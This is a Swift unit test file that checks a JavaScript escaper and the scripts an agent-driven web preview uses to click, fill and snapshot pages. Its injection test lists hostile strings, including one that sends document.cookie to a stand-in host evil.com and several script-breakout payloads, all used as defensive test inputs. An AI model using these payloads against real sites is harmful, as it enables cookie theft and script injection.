import XCTest
@testable import OculusUI
import Foundation

final class PreviewDOMTests: XCTestCase {

    // MARK: - jsString: the boundary between agent input and executed code

    func testJSStringQuotesAndEscapes() {
        XCTAssertEqual(jsString("hello"), "\"hello\"")
        XCTAssertEqual(jsString("say \"hi\""), "\"say \\\"hi\\\"\"")
        XCTAssertEqual(jsString("back\\slash"), "\"back\\\\slash\"")
    }

    /// Every value an agent supplies is interpolated into a script. These are the shapes that turn a
    /// value into code if the escaping is naive.
    func testJSStringNeutralisesScriptInjection() {
        let attacks = [
            "'; fetch('http://evil.com/'+document.cookie); //",
            "\"]; alert(1); [\"",
            "</script><script>alert(1)</script>",
            "\\\"; window.location='http://evil.com'; \\\"",
            "e1'] ); document.body.innerHTML=''; //",
        ]
        for attack in attacks {
            let encoded = jsString(attack)
            // A correctly encoded literal is one balanced double-quoted string: the only unescaped
            // quotes are the first and last characters.
            XCTAssertTrue(encoded.hasPrefix("\""), "\(attack) did not produce a quoted literal")
            XCTAssertTrue(encoded.hasSuffix("\""))
            let inner = String(encoded.dropFirst().dropLast())
            var i = inner.startIndex
            while i < inner.endIndex {
                if inner[i] == "\\" {
                    i = inner.index(i, offsetBy: 2, limitedBy: inner.endIndex) ?? inner.endIndex
                    continue
                }
                XCTAssertNotEqual(inner[i], "\"", "unescaped quote would end the literal early: \(encoded)")
                i = inner.index(after: i)
            }
        }
    }

    func testJSStringHandlesNewlinesAndUnicodeSeparators() {
        // A raw newline inside a JS string literal is a syntax error, and U+2028/U+2029 are treated
        // as line terminators by JavaScript even though JSON allows them raw — a classic escaper bug.
        for s in ["line1\nline2", "tab\there", "sep\u{2028}here", "para\u{2029}here", "null\u{0000}byte"] {
            let encoded = jsString(s)
            XCTAssertFalse(encoded.contains("\n"), "raw newline survived in \(encoded)")
            XCTAssertTrue(encoded.hasPrefix("\"") && encoded.hasSuffix("\""))
        }
    }

    // MARK: - Generated scripts

    func testClickScriptReferencesTheRefSafely() {
        let js = previewClickJS(ref: "e12")
        XCTAssertTrue(js.contains("data-ir-ref"))
        XCTAssertTrue(js.contains("\"e12\""))
        XCTAssertTrue(js.contains(".click()"))
    }

    func testFillScriptUsesTheNativeSetter() {
        let js = previewFillJS(ref: "e3", value: "hello")
        // A plain assignment is invisible to React, which installs its own value setter — the field
        // would look filled while the app's state never changed.
        XCTAssertTrue(js.contains("getOwnPropertyDescriptor"))
        XCTAssertTrue(js.contains("new Event('input'"))
        XCTAssertTrue(js.contains("new Event('change'"))
        XCTAssertTrue(js.contains("\"hello\""))
    }

    func testFillScriptEscapesAHostileValue() {
        // The literal is double-quoted, so a DOUBLE quote is what could terminate it early — single
        // quotes are inert inside it and JSON correctly leaves them alone.
        let breakout = "\"; alert(1); \""
        let js = previewFillJS(ref: "e1", value: breakout)
        XCTAssertFalse(js.contains("\"; alert(1); \""),
                       "the raw value would have closed the string literal and run as code")
        XCTAssertTrue(js.contains(jsString(breakout)), "the value must appear only as an encoded literal")

        // And a hostile REF, which is interpolated into a selector rather than a value.
        //
        // The assertion is that the RAW form — the one whose quotes are unescaped, and which would
        // therefore close the literal — is absent. The inner fragment on its own contains no quotes,
        // so it appears inside the encoded literal quite safely; asserting on it would be testing
        // for the wrong thing.
        let hostileRef = "e1\"]); alert(1); ([\""
        let clickJS = previewClickJS(ref: hostileRef)
        XCTAssertFalse(clickJS.contains(hostileRef), "the raw ref would have escaped the selector")
        XCTAssertTrue(clickJS.contains(jsString(hostileRef)))
    }

    func testSnapshotScriptWithholdsPasswordValues() {
        // A snapshot enters the agent's context and the durable transcript; a password's value has no
        // use in either.
        XCTAssertTrue(previewSnapshotJS.contains("password"))
        XCTAssertTrue(previewSnapshotJS.contains("data-ir-ref"))
        XCTAssertTrue(previewSnapshotJS.contains("JSON.stringify"))
    }

    func testSnapshotScriptBoundsItsOutput() {
        // An unbounded walk of a large page would exceed one frame and be useless to a model anyway.
        XCTAssertTrue(previewSnapshotJS.contains("MAX"))
        XCTAssertTrue(previewSnapshotJS.contains("truncated"))
    }

    // MARK: - Registry

    func testRegistryReportsNothingWhenNoPreviewIsOpen() {
        XCTAssertFalse(PreviewDOMRegistry.shared.isShowing(sessionID: "never-opened-session"))
    }

    func testRegistryIgnoresAnEmptySessionID() {
        // A nameless session must not become a wildcard that answers for everyone.
        PreviewDOMRegistry.shared.unregister(sessionID: "")
        XCTAssertFalse(PreviewDOMRegistry.shared.isShowing(sessionID: ""))
    }
}
